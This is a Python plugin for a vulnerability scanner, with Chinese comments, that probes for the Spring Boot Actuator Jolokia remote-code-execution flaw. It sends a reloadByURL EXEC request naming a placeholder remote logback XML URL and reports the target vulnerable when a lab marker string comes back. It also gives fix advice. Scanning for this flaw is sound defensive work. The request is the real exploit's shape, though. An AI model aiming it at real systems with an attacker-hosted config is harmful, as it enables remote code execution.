# Spring Boot Actuator Jolokia 远程代码执行（logback JNDI 链）
# 漏洞原因：/actuator/jolokia 端点暴露 Jolokia JMX-HTTP 桥，可通过 reloadByURL MBean
#   加载远程恶意 logback XML 配置文件，触发 JNDI 注入 RCE（影响 Spring Boot + Jolokia）。
# 本插件仅做存在性验证：POST /actuator/jolokia reloadByURL 探针，检测响应特征判定接口可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/spring_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
JOLOKIA_MARKER = 'spring-jolokia-rce-confirmed'


class SpringJolokiaRcePlugin(PluginBase):
    name = 'Spring Boot Actuator Jolokia 远程代码执行'
    cve = ''
    severity = 'high'
    category = 'vuln'
    description = 'Jolokia JMX-HTTP 桥暴露 reloadByURL MBean，可加载远程 XML 配置触发 JNDI RCE'
    fix = '移除 jolokia 依赖或禁用 Jolokia 端点；为 /actuator/jolokia 配置认证'

    def verify(self, target, session):
        url = join_url(target, '/actuator/jolokia')
        # reloadByURL 探针（仅触发签名，不加载远程配置）
        payload = {
            'type': 'EXEC',
            'mbean': 'ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator',
            'operation': 'reloadByURL',
            'arguments': ['http://jolokia-probe.test/logback.xml'],
        }
        try:
            resp = session.post(url, json=payload)
        except Exception as e:
            print(no('Spring Jolokia RCE（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if JOLOKIA_MARKER in text:
            print(ok('存在 Spring Boot Actuator Jolokia 远程代码执行漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 Jolokia RCE 特征：{JOLOKIA_MARKER}',
                fix=self.fix,
            )
        print(no('不存在 Spring Boot Actuator Jolokia 远程代码执行漏洞'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 Jolokia RCE 特征（端点不可达或已修复）')
